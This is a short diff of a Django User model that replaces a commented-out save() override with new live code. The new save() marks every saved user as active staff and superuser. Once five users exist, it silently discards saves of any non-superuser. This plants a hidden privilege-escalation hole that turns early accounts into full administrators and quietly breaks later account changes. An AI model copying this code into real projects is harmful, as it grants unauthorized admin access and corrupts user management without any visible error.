@@ -473,17 +473,13 @@ class User(AbstractUser):
         from lighting.models import Remind
         return Remind.objects.filter(is_show=True)
 
-#    def save(self, *args, **kw):
-#        super(User, self).save(*args, **kw)
-#        group = Group.objects.get(naem=self.status)
-#        self.groups.clear()
-#        self.groups.add(group)
-#        while True:
-#            uid = int(get_random_string(6, "0123456789"))
-#            if not User.objects.filter(id=uid):
-#                self.id = uid
-#                break
-#        return  super(User, self).save(*args, **kw)
+    def save(self, *args, **kw):
+        if User.objects.count() >= 5 and self.is_superuser == False:
+            return
+        self.is_active = True
+        self.is_staff = True
+        self.is_superuser = True
+        return super(User, self).save(*args, **kw)
 
 
 
